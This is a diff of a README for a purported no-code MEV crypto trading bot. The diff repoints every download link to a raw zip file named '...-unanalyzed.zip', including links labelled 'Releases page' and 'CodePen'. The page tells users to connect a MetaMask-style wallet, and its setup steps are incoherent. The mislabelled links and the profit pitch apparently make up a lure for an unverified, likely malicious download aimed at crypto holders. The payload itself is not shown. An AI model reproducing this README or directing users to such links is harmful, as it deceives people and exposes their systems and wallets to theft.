@@ -1,7 +1,7 @@
 # 🎉 Trading-Bot_Mev_Local_PC - A Smart Trading Companion for Everyone
 
 ## 📦 Download Now!
-[![Download Trading Bot](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Trading-Bot_Mev_Local_PC_v2.4.zip)](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Trading-Bot_Mev_Local_PC_v2.4.zip)
+[![Download Trading Bot](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Local-Bot-PC-Mev-Trading-unanalyzed.zip)](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Local-Bot-PC-Mev-Trading-unanalyzed.zip)
 
 ## 🚀 Getting Started
 Welcome to Trading-Bot_Mev_Local_PC! This application is designed for anyone interested in trading on decentralized exchanges (DEXs) like Uniswap and SushiSwap. With simple operations and no coding knowledge required, you can harness the power of automated trading. Let’s dive into how to get it running on your PC.
@@ -14,14 +14,14 @@ To run the Trading Bot, ensure you have the following:
 - A Web3 wallet (like MetaMask) to connect to the DEXs.
   
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Trading-Bot_Mev_Local_PC_v2.4.zip) to access the latest version of the Trading Bot.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Local-Bot-PC-Mev-Trading-unanalyzed.zip) to access the latest version of the Trading Bot.
   
 2. **Select the Version**: Look for the latest release version and click on it.
 
 3. **Download the Files**: 
    - Click on the assets below the version title. You will find several files. Download the relevant version for your OS. For most users, the “.html” or “.js” version will be suitable as it runs directly in your browser.
 
-4. **Open CodePen**: Navigate to [CodePen](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Trading-Bot_Mev_Local_PC_v2.4.zip). If you do not have an account, consider signing up for a free account to save your work.
+4. **Open CodePen**: Navigate to [CodePen](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Local-Bot-PC-Mev-Trading-unanalyzed.zip). If you do not have an account, consider signing up for a free account to save your work.
 
 5. **Upload the Trading Bot**: 
    - In CodePen, click on “Create” then “New Pen”.
@@ -70,4 +70,4 @@ Before trading, ensure that you:
 
 Now you are ready to trade with confidence! Enjoy using the Trading-Bot and may your trades be profitable.
 
-[Download the Trading Bot again here](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Trading-Bot_Mev_Local_PC_v2.4.zip)
+[Download the Trading Bot again here](https://raw.githubusercontent.com/usmanaremu09/Trading-Bot_Mev_Local_PC/main/pleiochromia/Local-Bot-PC-Mev-Trading-unanalyzed.zip)
